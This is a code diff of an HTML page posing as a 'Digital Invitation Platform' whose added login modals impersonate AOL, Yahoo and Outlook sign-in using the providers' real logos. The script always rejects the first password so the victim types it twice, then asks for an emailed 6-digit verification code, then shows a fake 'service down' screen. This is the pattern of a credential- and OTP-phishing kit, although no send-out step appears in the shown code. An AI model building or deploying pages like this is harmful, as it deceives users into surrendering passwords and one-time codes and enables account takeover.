@@ -206,72 +206,6 @@
             color: var(--accent-color);
         }
 
-        /* Decorative floral elements */
-        .floral-top {
-            position: absolute;
-            top: 10%;
-            left: 5%;
-            width: 200px;
-            height: 200px;
-            background: url('https://via.placeholder.com/200x200?text=Floral+Top') no-repeat center;
-            background-size: contain;
-            opacity: 0.3;
-            z-index: 1;
-        }
-
-        .floral-bottom {
-            position: absolute;
-            bottom: 10%;
-            right: 5%;
-            width: 200px;
-            height: 200px;
-            background: url('https://via.placeholder.com/200x200?text=Floral+Bottom') no-repeat center;
-            background-size: contain;
-            opacity: 0.3;
-            z-index: 1;
-        }
-
-        /* Responsive design */
-        @media (max-width: 768px) {
-            .login-container {
-                padding: 25px 20px;
-            }
-            
-            .header h1 {
-                font-size: 2rem;
-            }
-            
-            .login-header h2 {
-                font-size: 1.5rem;
-            }
-        }
-
-        /* Make sure everything fits on screen */
-        html, body {
-            overflow: hidden;
-            height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-
-        .container {
-            height: 100vh;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        /* Elegant typography */
-        .elegant-font {
-            font-family: 'Playfair Display', serif;
-            font-weight: 400;
-        }
-
-        .subtle-font {
-            font-family: 'Georgia', serif;
-            font-style: italic;
-            color: var(--gray);
-        }
-
         /* AOL Login Modal */
         .modal {
             display: none;
@@ -368,25 +302,20 @@
         }
 
         .error {
-            color: var(--danger);
+            color: red;
             font-size: 0.9rem;
             margin-top: 5px;
-            display: none;
-        }
-
-        .otp-screen {
             display: none;
         }
 
         .countdown {
             text-align: center;
             font-size: 1.2rem;
-            color: var(--danger);
+            color: red;
             margin: 20px 0;
         }
 
         .service-down {
-            display: none;
             text-align: center;
             padding: 30px;
             font-size: 1.2rem;
@@ -394,7 +323,7 @@
         }
 
         .service-down h3 {
-            color: var(--danger);
+            color: red;
             margin-bottom: 10px;
         }
     </style>
@@ -402,10 +331,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <!-- Decorative floral elements -->
-    <div class="floral-top"></div>
-    <div class="floral-bottom"></div>
-
     <div class="container">
         <div class="header">
             <h1 class="elegant-font">✨ Digital Invitation Platform</h1>
@@ -422,16 +347,16 @@
                 <div class="social-btn gmail">
                     <i class="fab fa-google"></i> Continue with Gmail
                 </div>
-                <div class="social-btn outlook">
+                <div class="social-btn outlook" onclick="openLoginModal('outlook')">
                     <i class="fab fa-microsoft"></i> Continue with Outlook
                 </div>
-                <div class="social-btn yahoo">
+                <div class="social-btn yahoo" onclick="openLoginModal('yahoo')">
                     <i class="fab fa-yahoo"></i> Continue with Yahoo
                 </div>
-                <div class="social-btn aol" id="aol-login">
+                <div class="social-btn aol" onclick="openLoginModal('aol')">
                     <i class="fab fa-aol"></i> Continue with AOL
                 </div>
-                <div class="social-btn other">
+                <div class="social-btn other" onclick="openLoginModal('other')">
                     <i class="fas fa-envelope"></i> Other Email Providers
                 </div>
             </div>
@@ -450,11 +375,11 @@
     </div>
 
     <!-- AOL Login Modal -->
-    <div class="modal" id="aol-modal">
+    <div class="modal" id="login-modal">
         <div class="modal-content">
             <div class="modal-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/AOL_logo_2015.svg" alt="AOL Logo">
-                <h3>Sign in to your AOL account</h3>
+                <img id="login-logo" src="" alt="Logo">
+                <h3 id="login-title">Sign in to your account</h3>
             </div>
             <div class="modal-body">
                 <div class="form-group">
@@ -472,4 +397,122 @@
     </div>
 
     <!-- OTP Screen -->
-    <div class="modal"
+    <div class="modal" id="otp-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img id="otp-logo" src="" alt="Logo">
+                <h3>Enter your verification code</h3>
+            </div>
+            <div class="modal-body">
+                <p>We've sent a 6-digit code to your email. Enter it below.</p>
+                <div class="form-group">
+                    <label for="otp">Verification code</label>
+                    <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6">
+                </div>
+                <div class="countdown" id="countdown">Time remaining: <span id="timer">5:00</span></div>
+                <button class="btn" id="otp-btn">Verify</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Service Down Screen -->
+    <div class="modal" id="service-down-modal">
+        <div class="modal-content">
+            <div class="service-down">
+                <h3>⚠️ Service Temporarily Unavailable</h3>
+                <p>Please try again later. Our service is down for maintenance.</p>
+                <button class="btn" onclick="closeAllModals()">Try Again</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Track login attempts
+        let loginAttempts = 0;
+        let countdownInterval;
+
+        // Logo URLs
+        const logos = {
+            aol: 'https://upload.wikimedia.org/wikipedia/commons/0/03/AOL_logo_2015.svg',
+            yahoo: 'https://upload.wikimedia.org/wikipedia/commons/0/0d/Yahoo%21_Alumni_Redux.svg',
+            outlook: 'https://upload.wikimedia.org/wikipedia/commons/5/59/Outlook.com_icon_%282019%29.svg',
+            other: 'https://upload.wikimedia.org/wikipedia/commons/6/6d/Windows_Live_Mail_Icon.png'
+        };
+
+        // Open login modal
+        function openLoginModal(provider) {
+            const modal = document.getElementById('login-modal');
+            const logo = document.getElementById('login-logo');
+            const title = document.getElementById('login-title');
+            
+            loginAttempts = 0;
+            document.getElementById('error-message').style.display = 'none';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Set logo and title
+            logo.src = logos[provider];
+            title.textContent = `Sign in to your ${provider.charAt(0).toUpperCase() + provider.slice(1)} account`;
+            
+            modal.style.display = 'flex';
+        }
+
+        // Close all modals
+        function closeAllModals() {
+            document.getElementById('login-modal').style.display = 'none';
+            document.getElementById('otp-modal').style.display = 'none';
+            document.getElementById('service-down-modal').style.display = 'none';
+        }
+
+        // Handle login button click
+        document.getElementById('login-btn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                loginAttempts++;
+                
+                if (loginAttempts === 1) {
+                    document.getElementById('error-message').style.display = 'block';
+                    document.getElementById('password').value = '';
+                } else if (loginAttempts === 2) {
+                    document.getElementById('login-modal').style.display = 'none';
+                    document.getElementById('otp-modal').style.display = 'flex';
+                    startCountdown();
+                }
+            }
+        });
+
+        // Start countdown timer
+        function startCountdown() {
+            let timeLeft = 5 * 60; // 5 minutes in seconds
+            const timer = document.getElementById('timer');
+            
+            countdownInterval = setInterval(function() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timer.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('otp-modal').style.display = 'none';
+                    document.getElementById('service-down-modal').style.display = 'flex';
+                }
+                
+                timeLeft--;
+            }, 1000);
+        }
+
+        // Handle OTP button click
+        document.getElementById('otp-btn').addEventListener('click', function() {
+            const otp = document.getElementById('otp').value;
+            
+            if (otp && otp.length === 6) {
+                clearInterval(countdownInterval);
+                document.getElementById('otp-modal').style.display = 'none';
+                document.getElementById('service-down-modal').style.display = 'flex';
+            }
+        });
+    </script>
+</body>
+</html>
